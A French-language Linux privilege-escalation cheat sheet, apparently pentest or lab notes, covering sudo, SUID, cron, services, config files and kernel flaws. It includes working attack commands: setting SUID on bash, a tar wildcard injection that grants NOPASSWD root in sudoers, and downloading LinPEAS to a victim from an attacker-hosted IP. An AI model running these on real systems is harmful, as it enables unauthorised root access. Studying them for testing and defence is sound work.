## Sudo 
* **Base de la faille** : L'utilisation inappropriée de la commande `sudo` par les administrateurs système peut donner à certains utilisateurs des privilèges qu'ils ne devraient pas avoir. Si un utilisateur a le droit d'exécuter une commande ou un binaire avec des privilèges `root` sans restriction, cela peut être exploité.

* **Comment c'est possible** : Disons qu'un utilisateur peut exécuter `vim` avec `sudo` sans mot de passe. Cela signifie qu'il peut éditer n'importe quel fichier en tant que `root` ou lancer un shell avec des droits `root`.
1. On regarde les commandes executables en sudo 
```
sudo -l
```
2. On cherche sur GTFObins les possibilités de la commande en tant que root pour :
	* Obtenir un shell root
	* Lire un fichier sensible : /etc/shadow
	* Modifier fichier sensible (crontab par exemple)
	* Déployer un reverse shell
	* Transfert de fichiers
## SUID
* **Base de la faille** : Les binaires avec le bit SUID permettent à l'exécutable d'être exécuté avec les droits du propriétaire du fichier plutôt qu'avec les droits de l'utilisateur qui l'exécute. Si un binaire vulnérable ou mal configuré a le bit SUID défini, cela peut être exploité.
* **Comment c'est possible** : Un exemple courant est un binaire qui a le bit SUID défini et qui exécute des opérations sans valider ou désinfecter correctement les entrées. Un attaquant pourrait exploiter cela pour exécuter des commandes arbitraires.
1. Lister les binaires (commandes), exécutable en tant que leur propriétaires (root)
```
find / -perm -4000 2>/dev/null
```
2. Ajouter le SUID via une autre faille (dans un fichier par exemple)
```
chmod u+s /bin/bash
```
## Cron
* **Base de la faille** : Des tâches `cron` executés en tant que root peuvent être attaquables en modifiant l'execution finale de la tache et on peut se créer un reverse shell root
1. Lister les tâches qui seront executés de facons régulière en tant que root
```
cat /etc/crontab
ls -alh /etc/cron* cat /etc/crontab
```
2. Si un tache est executé et se base sur un URL, on peut modifier /etc/hosts
3. Voir si archivage, si possibilité de tar wildcard avec archivage complet d'un repetoire
```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh  
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"  
touch "/var/www/html/--checkpoint=1"
```
## Services root 
* **Base de la faille** : Les services sont souvent lancés avec des droits élevés. Si un service est vulnérable ou mal configuré, il peut être exploité pour obtenir ces droits.
* **Comment c'est possible** : Un service mal configuré pourrait, par exemple, charger des bibliothèques à partir d'un chemin non sécurisé, permettant à un attaquant d'y injecter sa propre bibliothèque.
1. Lister les services qui se lancent en root pour y injecter des modifications
```
systemctl list-units --type=service
```

## Fichier de configuration mal configurés
* **Base de la faille** : Les fichiers de configuration peuvent parfois contenir des informations sensibles comme des mots de passe. Si ces fichiers sont lisibles par des utilisateurs non privilégiés, ils peuvent être exploités.
* **Comment c'est possible** : Un attaquant qui peut lire un fichier de configuration contenant un mot de passe en clair peut utiliser ce mot de passe pour obtenir des privilèges ou accéder à d'autres systèmes ou services.
```
find /etc/ -readable -type f 2>/dev/null
```

## Permissions de groupe laxistes
* **Base de la faille** : Si un fichier ou un répertoire a des permissions de groupe inappropriées, cela peut permettre à des utilisateurs non autorisés d'écrire ou de modifier ces fichiers.
* **Comment c'est possible** : Si un utilisateur fait partie d'un groupe qui peut écrire dans un fichier exécuté par un utilisateur avec des privilèges élevés, il peut modifier ce fichier pour inclure du code malveillant.
1. Lister les répertoires ou mon groupe est présent 
```
find / -group GROUP_NAME -perm -g+w 2>/dev/null
```
## Faiblesses de sécurité dans le noyau
* **Base de la faille** : Des vulnérabilités dans le noyau peuvent permettre à un attaquant d'élever ses privilèges de `user` à `root`.
* **Comment c'est possible** : Si un utilisateur peut exploiter une vulnérabilité du noyau, comme une condition de course, il peut potentiellement obtenir un accès `root`. Des outils comme `searchsploit` peuvent être utilisés pour trouver des exploits connus pour une version de noyau spécifique.
1. Afficher les informations du noyau
```
uname -a
```

## Linpeas
1. Télécharger LinPeas et lancer un serveur Web python pour transférer le script
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80 #Host
```
2. Placer la cible dans un répertoire ou elle peut écrire pour télécharger
```
cd /tmp/
```
3. Télécharger depuis la victime le script et le rendre executable 
```
wget [IP]/linpeas.sh
curl [IP]/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
```
